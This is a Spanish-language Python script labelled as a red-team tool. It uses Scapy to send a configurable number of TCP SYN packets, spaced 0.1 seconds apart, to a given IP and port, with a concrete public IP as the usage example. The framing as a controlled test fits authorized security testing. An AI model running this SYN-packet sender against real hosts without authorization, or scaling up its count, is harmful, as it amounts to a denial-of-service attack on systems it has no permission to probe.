
# RED TEAM — packet_attack.py
# Ataque SYN controlado para pruebas
# Autor: Isaac Robles Meza (Red Team)

# Uso:
#   sudo python3 red_team/packet_attack.py <IP_OBJETIVO> [PUERTO] [CANTIDAD]

# Ejemplo:
#   sudo python3 red_team/packet_attack.py 158.23.162.91 80 20

# Requiere:
#   - Python 3.x
#   - Scapy instalado
#   - Ejecutar con privilegios (sudo)

# Funciones:
#   1) Recibe IP, puerto y cantidad de SYN a enviar.
#   2) Crea paquetes TCP con flag SYN.
#   3) Envía los paquetes de forma controlada sin romper el servicio.
# ---------------------------------------

import sys
import random
import time
from datetime import datetime

from scapy.all import IP, TCP, send  # type: ignore

# ---------------------------------------
# Verifica y obtiene los argumentos
# ---------------------------------------
def obtener_parametros():
    if len(sys.argv) < 2:
        print("Uso:")
        print("  sudo python3 red_team/packet_attack.py <IP_OBJETIVO> [PUERTO] [CANTIDAD]")
        print("Ejemplo:")
        print("  sudo python3 red_team/packet_attack.py 158.23.162.91 80 20")
        sys.exit(1)

    ip_objetivo = sys.argv[1]

    # Puerto opcional (por defecto 80)
    if len(sys.argv) >= 3:
        puerto = int(sys.argv[2])
    else:
        puerto = 80

    # Cantidad opcional (por defecto 20 SYN)
    if len(sys.argv) >= 4:
        cantidad = int(sys.argv[3])
    else:
        cantidad = 20

    return ip_objetivo, puerto, cantidad

# ---------------------------------------
# Crea un paquete TCP SYN hacia el objetivo
# ---------------------------------------
def crear_paquete_syn(ip_objetivo: str, puerto_destino: int):
    puerto_origen = random.randint(1024, 65535)

    paquete = IP(dst=ip_objetivo) / TCP(
        sport=puerto_origen,
        dport=puerto_destino,
        flags="S",
        seq=random.randint(0, 2**32 - 1)
    )

    return paquete

# ---------------------------------------
# Envía varios SYN de forma controlada
# ---------------------------------------
def ejecutar_ataque(ip_objetivo: str, puerto_destino: int, cantidad: int):
    print("====================================")
    print("  RED TEAM - ATAQUE SYN CONTROLADO  ")
    print("====================================")
    print(f"[INFO] IP objetivo : {ip_objetivo}")
    print(f"[INFO] Puerto      : {puerto_destino}")
    print(f"[INFO] Cantidad    : {cantidad} paquetes SYN")
    print("------------------------------------")

    for i in range(1, cantidad + 1):
        paquete = crear_paquete_syn(ip_objetivo, puerto_destino)
        send(paquete, verbose=0)
        print(f"[ENVÍO] Paquete SYN #{i} -> {ip_objetivo}:{puerto_destino}")
        time.sleep(0.1)  # pequeño delay para que sea controlado

    print("------------------------------------")
    print("[LISTO] Ataque SYN controlado finalizado.")

    # Log sencillo en consola con timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[LOG] Fecha/hora de la prueba: {timestamp}")

# ---------------------------------------
# MAIN
# ---------------------------------------
def main():
    ip_objetivo, puerto_destino, cantidad = obtener_parametros()
    ejecutar_ataque(ip_objetivo, puerto_destino, cantidad)

if __name__ == "__main__":
    main()
